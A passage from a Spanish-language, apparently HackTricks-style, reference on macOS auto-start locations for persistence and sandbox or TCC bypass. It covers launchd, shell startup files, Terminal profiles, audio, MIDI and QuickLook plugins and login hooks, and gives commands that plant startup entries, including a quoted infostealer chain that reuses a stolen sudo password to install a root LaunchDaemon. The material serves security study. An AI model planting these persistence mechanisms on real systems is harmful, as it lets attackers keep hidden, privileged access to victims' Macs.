# Inicio automático de macOS

{{#include ../banners/hacktricks-training.md}}

Esta sección se basa en gran medida en la serie de blogs [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Su objetivo es identificar ubicaciones donde escribir un archivo puede conducir a la ejecución posterior de código, el evento que desencadena la ejecución y los permisos necesarios. Que exista una ubicación no demuestra que el mecanismo esté habilitado. Las comprobaciones locales indicadas a continuación se realizaron en macOS 26.5.2 (5 de octubre de 2026); no establecen el comportamiento en todas las versiones de macOS.

> [!NOTE]
> «Activado por escritura» no siempre significa que «se ejecuta inmediatamente después de escribir». Algunas ubicaciones solo se leen al iniciar sesión, cuando se inicia una aplicación específica o cuando un usuario realiza una acción. Un payload modificable dentro de un job ya configurado tampoco equivale a tener permiso para registrar un nuevo job. Prueba en una cuenta desechable o una VM antes de depender de una técnica.

## Sandbox Bypass

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para **sandbox bypass**, que te permiten simplemente ejecutar algo **escribiéndolo en un archivo** y **esperando** a que ocurra una **acción** muy **común**, transcurra un **periodo de tiempo** determinado o se realice una **acción que normalmente puedes llevar a cabo** desde dentro de un sandbox sin necesitar permisos de root.

### Launchd

- Útil para sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicaciones

- **`/Library/LaunchAgents`**
  - **Desencadenante**: Inicio de sesión del usuario (o registro explícito)
  - Requiere root
- **`/Library/LaunchDaemons`**
  - **Desencadenante**: Arranque del sistema (o registro explícito)
  - Requiere root
- **`/System/Library/LaunchAgents`**
  - **Desencadenante**: Inicio de sesión del usuario; ubicación protegida del sistema de Apple
- **`/System/Library/LaunchDaemons`**
  - **Desencadenante**: Arranque del sistema; ubicación protegida del sistema de Apple
- **`~/Library/LaunchAgents`**
  - **Desencadenante**: Volver a iniciar sesión

No existe una ubicación `~/Library/LaunchDaemons` que `launchd` examine. Los jobs por usuario deben estar en `~/Library/LaunchAgents`; el directorio de daemons del sistema es `/Library/LaunchDaemons`. La [guía de inicio de launchd de Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) documenta las ubicaciones examinadas.

> [!TIP]
> Como dato interesante, **`launchd`** tiene una property list integrada en la sección Mach-o `__Text.__config` que contiene otros servicios conocidos que launchd debe iniciar. Además, estos servicios pueden incluir `RequireSuccess`, `RequireRun` y `RebootOnSuccess`, lo que significa que deben ejecutarse y completarse correctamente.
>
> Por supuesto, no se puede modificar debido a la firma de código.

#### Descripción y explotación

**`launchd`** es el **primer** **proceso** que ejecuta el kernel de OX S durante el arranque y el último en finalizar al apagarse. Siempre debería tener el **PID 1**. Este proceso **lee y ejecuta** las configuraciones indicadas en las **plists** **ASEP** de:

- `/Library/LaunchAgents`: Agents por usuario instalados por el administrador
- `/Library/LaunchDaemons`: Daemons de todo el sistema instalados por el administrador
- `/System/Library/LaunchAgents`: Agents por usuario proporcionados por Apple.
- `/System/Library/LaunchDaemons`: Daemons de todo el sistema proporcionados por Apple.

Cuando un usuario inicia sesión, `launchd` carga las plists de `~/Library/LaunchAgents` de ese usuario con los permisos de dicho usuario. Los jobs se inician según sus claves; cargar una plist no implica que el proceso se ejecute de inmediato.

La **principal diferencia entre agents y daemons es que los agents se cargan cuando el usuario inicia sesión, mientras que los daemons se cargan al iniciar el sistema** (ya que hay servicios, como ssh, que deben ejecutarse antes de que cualquier usuario acceda al sistema). Además, los agents pueden usar la GUI, mientras que los daemons deben ejecutarse en segundo plano.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Cada elemento de `ProgramArguments` es un argumento independiente; `launchd` no interpreta una cadena única como un comando de shell. El ejemplo corregido anterior puede comprobarse sintácticamente sin cargarlo mediante `plutil -lint /path/to/example.plist`. Consulta la entrada local de `man launchd.plist` para `ProgramArguments`, `RunAtLoad` y `KeepAlive`.

#### Activadores de eventos de archivo en jobs existentes

Un agente o daemon **ya cargado** puede usar `WatchPaths` para iniciarse cuando cambia una ruta especificada. `QueueDirectories` inicia un job mientras un directorio no está vacío; `StartOnMount` lo inicia cuando se monta un volumen. [La guía de launchd de Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) incluye ejemplos de `WatchPaths` y `QueueDirectories`. Una escritura en un archivo supervisado activa el **job ya configurado**; solo permite la ejecución de código arbitrario si quien escribe también puede controlar el ejecutable, el script o los datos que interpreta el job. Escribir simplemente un plist nuevo fuera de una ubicación explorada o registrada no lo carga.

Esta PoC de autolimpieza registra un **user agent temporal** con un nombre único, modifica únicamente su propio archivo supervisado y elimina el agente. Se ejecutó correctamente en macOS 26.5.2 sin cerrar sesión ni reiniciar:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

La ejecución local imprimió `watch fired: True`, y `bootout` se completó correctamente. Aquí se usa `launchctl bootstrap` solo dentro del PoC aislado; **no** es necesario para un job que ya está cargado. Para evaluar de forma segura un job existente, lee su plist y la ruta resuelta de `ProgramArguments`, y luego comprueba si el ejecutable pertinente o el archivo interpretado tiene permisos de escritura, sin modificarlo.

Hay casos en los que un **agent debe ejecutarse antes de que el usuario inicie sesión**; estos se llaman **PreLoginAgents**. Por ejemplo, esto es útil para proporcionar tecnología de asistencia al iniciar sesión. También se pueden encontrar en `/Library/LaunchAgents` (consulta [**aquí**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un ejemplo).

> [!TIP]
> Los nuevos archivos de configuración de Daemons o Agents se **cargarán después del próximo reinicio o usando** `launchctl load <target.plist>`. También es **posible cargar archivos .plist sin esa extensión** con `launchctl -F <file>` (sin embargo, esos archivos plist no se cargarán automáticamente después de reiniciar).\
> También es posible **descargarlos** con `launchctl unload <target.plist>` (el proceso al que apunta se terminará),
>
> Para **asegurarte** de que no haya **nada** (como una anulación) que **impida** que un **Agent** o **Daemon** **se ejecute**, ejecuta: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Lista todos los agents y daemons cargados por el usuario actual:

```bash
launchctl list
```

#### Ejemplo de cadena maliciosa de LaunchDaemon (reutilización de contraseña)

Un infostealer reciente para macOS reutilizó una **contraseña de sudo capturada** para instalar un agente de usuario y un LaunchDaemon de root:<sup>[[1]](#references)</sup>

- Escribe el bucle del agente en `~/.agent` y dale permisos de ejecución.
- Genera un plist en `/tmp/starter` que apunte a ese agente.
- Reutiliza la contraseña robada con `sudo -S` para copiarlo en `/Library/LaunchDaemons/com.finder.helper.plist`, establecer `root:wheel` y cargarlo con `launchctl load`.
- Inicia el agente silenciosamente con `nohup ~/.agent >/dev/null 2>&1 &` para desconectar la salida.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Un plist de daemon ubicado en `/Library/LaunchDaemons` no se vuelve seguro por asignarle la propiedad a un usuario. `launchd` requiere una propiedad y unos permisos adecuados para los trabajos del sistema y puede rechazar un plist inseguro. Un daemon propiedad de root normalmente se ejecuta como root, a menos que su configuración seleccione otra cuenta. Comprueba `UserName`, `GroupName`, la propiedad y los diagnósticos de `launchctl` del trabajo; no deduzcas la identidad de ejecución únicamente a partir del nombre del propietario del plist.

#### Más información sobre launchd

**`launchd`** es el **primer** proceso de modo usuario que inicia el **kernel**. El inicio del proceso debe ser **correcto** y este **no puede terminar ni fallar**. Incluso está **protegido** contra algunas **señales de terminación**.

Una de las primeras cosas que haría `launchd` es **iniciar** todos los **daemons**, como:

- **Daemons de temporizador**, según la hora de ejecución:
  - `com.apple.atrun.plist` invoca `/usr/libexec/atrun` con `StartInterval = 30` segundos en macOS 26.5.2; su estado efectivo puede diferir del valor de la clave `Disabled` del plist porque launchd mantiene las anulaciones por separado.
  - `com.vix.cron.plist` invoca `/usr/sbin/cron` cuando `/usr/lib/cron/tabs` contiene trabajos. `com.apple.systemstats.daily` es un servicio programado distinto, no el daemon cron.
- **Daemons de red**, como:
  - `org.cups.cups-lpd`: escucha por TCP (`SockType: stream`) con `SockServiceName: printer`
    - SockServiceName debe ser un puerto o un servicio de `/etc/services`
  - `com.apple.xscertd.plist`: escucha por TCP en el puerto 1640
- **Daemons de ruta**, que se ejecutan cuando cambia una ruta especificada:
  - `com.apple.postfix.master`: comprueba la ruta `/etc/postfix/aliases`
- **Daemons de notificaciones IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Puerto Mach:**
  - `com.apple.xscertd-helper.plist`: indica el nombre `com.apple.xscertd.helper` en la entrada `MachServices`
- **UserEventAgent:**
  - Es distinto del anterior. Hace que launchd inicie apps en respuesta a eventos específicos. Sin embargo, en este caso, el binario principal no es `launchd`, sino `/usr/libexec/UserEventAgent`. Carga plugins desde la carpeta restringida por SIP /System/Library/UserEventPlugins/, donde cada plugin indica su inicializador en la clave `XPCEventModuleInitializer` o, en el caso de plugins antiguos, en el diccionario `CFPluginFactories`, bajo la clave `FB86416D-6164-2070-726F-70735C216EC0` de su `Info.plist`.

### archivos de inicio del shell

Análisis: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Análisis (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Pero hay que encontrar una app con un bypass de TCC que ejecute un shell que cargue estos archivos

#### Ubicaciones

- **`~/.zshenv`** (o un archivo compilado más reciente **`~/.zshenv.zwc`**)
  - **Activación**: Cualquier invocación normal de zsh, incluido un `zsh -c` no interactivo; `zsh -f` omite los archivos de inicio del usuario.
- **`~/.zshrc`**
  - **Activación**: Al iniciar zsh interactivo.
- **`~/.zprofile`, `~/.zlogin`**
  - **Activación**: Al iniciar zsh de inicio de sesión; se leen antes y después de `.zshrc`, respectivamente.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Activación**: Al abrir un terminal con zsh
  - Se requiere root
- **`~/.zlogout`**
  - **Activación**: Cuando un zsh de inicio de sesión termina normalmente; no al cerrar cualquier terminal o shell.
- **`/etc/zlogout`**
  - **Activación**: Al cerrar un terminal con zsh
  - Se requiere root
- Posiblemente haya más información en: **`man zsh`**
- **`~/.bashrc`**
  - **Activación**: Al iniciar Bash interactivo **sin inicio de sesión**. Un Bash interactivo de inicio de sesión solo lo lee si un archivo de inicio de sesión lo carga explícitamente.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Activación**: Al iniciar Bash de inicio de sesión; se ejecuta el primer archivo legible, en ese orden. `~/.profile` se omite si existe cualquiera de los archivos anteriores.
- **`/etc/profile`**
  - **Activación**: Al iniciar Bash de inicio de sesión; cambiarlo requiere root.
- **`~/.tcshrc`** o, si no existe, **`~/.cshrc`**
  - **Activación**: Al iniciar `tcsh`, incluido un `tcsh -c` no interactivo en este Mac. El usuario debe invocar realmente `tcsh`; no es el shell predeterminado de macOS.
- **`~/.login`**
  - **Activación**: Al iniciar un `tcsh` de inicio de sesión, después de su archivo rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Activación**: Se espera que se activen con xterm, pero **no está instalado** y, aun después de instalarlo, aparece este error: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Descripción y explotación

Al iniciar un entorno de shell como `zsh` o `bash`, **se ejecutan ciertos archivos de inicio**. Actualmente, macOS usa `/bin/zsh` como shell predeterminado. Que Terminal o SSH inicien un shell de inicio de sesión o interactivo depende de su configuración; no des por sentado que todos los archivos anteriores se ejecutan en cada sesión. Aunque `bash` y `sh` también están disponibles en macOS, hay que invocarlos explícitamente para usarlos.<sup>[[2]](#references)</sup> La [referencia de archivos de inicio de zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) especifica el orden, la sobrescritura de `ZDOTDIR` y la regla de `.zwc`.

El siguiente experimento de solo lectura usó un `ZDOTDIR` desechable en macOS 26.5.2. Muestra qué archivos del usuario se leyeron; no se modificó ningún archivo de inicio real del shell:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

El orden observado fue `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` ya debe apuntar al directorio alternativo; no basta con escribir archivos en un directorio arbitrario.

La [referencia de inicio de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) distingue entre shells de login e interactivos. En la máquina de prueba con macOS 26.5.2, un `HOME` aislado que contenía los cuatro archivos de inicio de usuario produjo estos resultados: `bash -c` → ninguno, `bash -ic` → `.bashrc`, `bash -lc` y `bash -lic` → solo `.bash_profile`. Al eliminar `.bash_profile`, Bash de login leyó `.bash_login` y, al eliminar también ese archivo, `.profile`. `BASH_ENV` puede indicar a Bash no interactivo que lea un archivo, pero esa variable de entorno ya debe estar definida en el proceso que lo invoca. Un `exit` explícito desde un Bash de login también puede cargar `~/.bash_logout`.

El manual local de `tcsh(1)` documenta su orden de inicio independiente. Con un `HOME` desechable, `/bin/tcsh -c :` leyó `.tcshrc` o `.cshrc` si no existía `.tcshrc`. Un `tcsh` de login desechable leyó `.tcshrc` y `.login`. Estas comprobaciones solo crearon y eliminaron archivos temporales.

### Aplicaciones reabiertas

> [!CAUTION]
> En las pruebas, configurar la explotación indicada y cerrar sesión y volver a iniciarla, o incluso reiniciar, no ejecutó la app. Es posible que la app deba estar en ejecución al realizar estas acciones.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Activador**: reiniciar y reabrir aplicaciones

#### Descripción y explotación

Todas las aplicaciones que se van a reabrir están dentro del plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Así que, para hacer que entre las aplicaciones reabiertas se inicie una tuya, solo tienes que **añadir tu app a la lista**.

El UUID se puede encontrar listando ese directorio o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Para comprobar qué aplicaciones se volverán a abrir, puedes hacer lo siguiente:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Para **añadir una aplicación a esta lista** puedes usar:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Preferencias de Terminal

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Útil para omitir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Omisión de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal solía tener permisos FDA del usuario que lo usaba

#### Ubicación

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Activador**: Abrir una nueva ventana o pestaña de Terminal usando el perfil cuya configuración de Shell contiene el comando de inicio

#### Descripción y explotación

En **`~/Library/Preferences`** se almacenan las preferencias del usuario para las aplicaciones. Algunas de estas preferencias pueden contener una configuración para **ejecutar otras aplicaciones/scripts**.<sup>[[5]](#references)</sup>

Por ejemplo, Terminal puede ejecutar un comando al iniciarse:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Esta configuración se refleja en el archivo **`~/Library/Preferences/com.apple.Terminal.plist`** de esta manera:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Si el perfil correspondiente contiene un comando de inicio y Terminal lee esa preferencia, una nueva sesión que use ese perfil puede ejecutarlo. [La guía actual de Terminal de Apple](https://support.apple.com/guide/terminal/trmlshll/mac) documenta el comando de **Shell → Startup** para cada perfil. Abrir Terminal sin iniciar una nueva sesión que use ese perfil no es suficiente. Los cambios de preferencias que aparecen a continuación **no** se realizaron en el Mac de investigación.

Puedes añadirlo desde el cli con:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Scripts de Terminal / Otras extensiones de archivo

- Útil para omitir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Omisión de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal puede usar los permisos de FDA del usuario que lo utiliza

#### Ubicación

- **En cualquier lugar**
  - **Activación**: Abrir el archivo `.terminal`, `.command` o `.tool` correspondiente

#### Descripción y explotación

Si un usuario abre un archivo de configuración **`.terminal`**, Terminal puede crear una sesión a partir de su perfil; los archivos ejecutables **`.command`** y **`.tool`** también pueden abrirse en Terminal. Esto requiere abrir explícitamente el archivo; no se ejecuta simplemente al abrir Terminal. Cualquier acceso TCC heredado depende de los permisos que Terminal tenga realmente y de la operación intentada. El ejemplo histórico de abajo no se ejecutó en el Mac de investigación.

Pruébalo con:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

También podrías usar las extensiones **`.command`** y **`.tool`** con contenido de scripts de shell normales; también se abrirán con Terminal.

> [!CAUTION]
> Si Terminal tiene **Acceso total al disco**, podrá completar esa acción (ten en cuenta que el comando ejecutado será visible en una ventana de Terminal).

### Complementos de audio

Informe: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Informe: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Puede que obtengas acceso adicional a TCC

#### Ubicación

- **`/Library/Audio/Plug-Ins/HAL`**
  - Se requieren privilegios de root
  - **Activación**: el servidor Core Audio carga un plug-in de dispositivo HAL compatible; un reinicio del servidor puede provocar que vuelva a detectarlo
- **`/Library/Audio/Plug-ins/Components`**
  - Se requieren privilegios de root
  - **Activación**: un host de audio detecta e instancia el Audio Unit instalado
- **`~/Library/Audio/Plug-ins/Components`**
  - **Activación**: un host de audio detecta e instancia el Audio Unit instalado
- **`/System/Library/Components`**
  - Ubicación proporcionada y protegida por el sistema de Apple
  - **Activación**: un host de audio instancia un componente del sistema compatible

#### Descripción

Según los informes anteriores, es posible **compilar algunos complementos de audio** y hacer que se carguen.<sup>[[6]](#references)[[7]](#references)</sup>

Los plug-ins de dispositivos HAL y los Audio Units se cargan por vías distintas. La [guía de Apple sobre el alojamiento de Audio Units](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) indica que un host debe encontrar e instanciar un componente; copiar uno en un directorio de búsqueda o reiniciar `coreaudiod` no demuestra por sí solo que se ejecute. Los plug-ins AUv2 se ejecutan en el proceso del host, mientras que la [guía actual de Apple sobre Audio Units](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) indica que, en macOS, AUv3 se ejecuta de forma predeterminada en un proceso separado. Los controles de firma, sandbox y validación de bibliotecas dependen del host. No se instaló ni ejecutó ningún plug-in de audio en el Mac de investigación.

### Controladores CoreMIDI (MIDIServer)

Informe: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Tu código se ejecuta dentro del proceso `MIDIServer`, no en el sandbox de tu app
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` se ejecuta bajo su propio perfil de sandbox `seatbelt`

#### Ubicación

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - No se requieren privilegios de root (escribible por el usuario)
  - **Activación**: `MIDIServer` se inicia o reinicia. Se inicia bajo demanda la primera vez que cualquier proceso usa CoreMIDI (al abrir *Configuración de Audio MIDI*, GarageBand, un DAW o una página que use WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Se requieren privilegios de root
  - **Activación**: igual que arriba

#### Descripción y explotación

`MIDIServer` de Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) carga bundles de **controladores** MIDI desde los directorios `Audio/MIDI Drivers`. El binario está firmado por Apple, pero incluye el entitlement `com.apple.security.cs.disable-library-validation`, por lo que carga un bundle **sin firmar o firmado ad hoc por otro equipo**, lo que permite ejecutar código dentro de un proceso separado propiedad de Apple **sin privilegios de root**.<sup>[[53]](#references)</sup>

Verificado en macOS 26 (solo lectura):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Un controlador es un bundle estándar que exporta una factory `MIDIDriverInterface`; colocar el payload en la factory/constructor hace que se ejecute en cuanto `MIDIServer` enumera los controladores. Compílalo, colócalo como `~/Library/Audio/MIDI Drivers/Evil.plugin` y luego fuerza su carga sin cerrar sesión ni reiniciar:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Plugins de QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Podrías obtener acceso adicional a TCC

#### Ubicación

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Descripción y explotación

Los plugins de QuickLook se pueden ejecutar cuando **activas la vista previa de un archivo** (pulsa la barra espaciadora con el archivo seleccionado en Finder) y hay instalado un **plugin compatible con ese tipo de archivo**.<sup>[[8]](#references)</sup>

Es posible compilar tu propio plugin de QuickLook, colocarlo en una de las ubicaciones anteriores para cargarlo y, después, ir a un archivo compatible y pulsar la barra espaciadora para activarlo.

Estas rutas se refieren a paquetes `.qlgenerator` heredados; [la guía de arquitectura de Quick Look de Apple](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) documenta el orden de búsqueda y los tipos de archivo coincidentes. Las **extensiones de app** actuales de Quick Look se empaquetan con una app y tienen reglas de registro y ejecución distintas. La presencia de un generador no demuestra que sea el seleccionado para ese tipo ni que su código se ejecute dentro del propio Finder. Se revisó la ruta de generadores heredados mediante documentación y la presencia de directorios; no se instaló ni cargó ningún generador en el Mac de investigación.

### ~~Hooks de inicio/cierre de sesión~~

> [!CAUTION]
> Esto no me funcionó, ni con el LoginHook del usuario ni con el LogoutHook de root

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Debes poder ejecutar algo como `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - Ubicado en `~/Library/Preferences/com.apple.loginwindow.plist`

Están obsoletos, pero se pueden usar para ejecutar comandos cuando un usuario inicia sesión.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Esta configuración se almacena en `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Para eliminarlo:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

El del usuario root se almacena en **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para **sandbox bypass** que permiten ejecutar algo simplemente **escribiéndolo en un archivo** y **esperando condiciones poco comunes**, como que haya **programas específicos instalados, acciones de usuario «poco comunes»** o entornos concretos.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Útil para sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Sin embargo, debes poder ejecutar el binario `crontab`
  - O ser root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/usr/lib/cron/tabs/`**
  - Se requiere root para el acceso directo de escritura. No se requiere root si puedes ejecutar `crontab <file>`
  - **Activador**: El horario del crontab instalado. `at` y `periodic` son mecanismos independientes que se describen a continuación.

#### Descripción y explotación

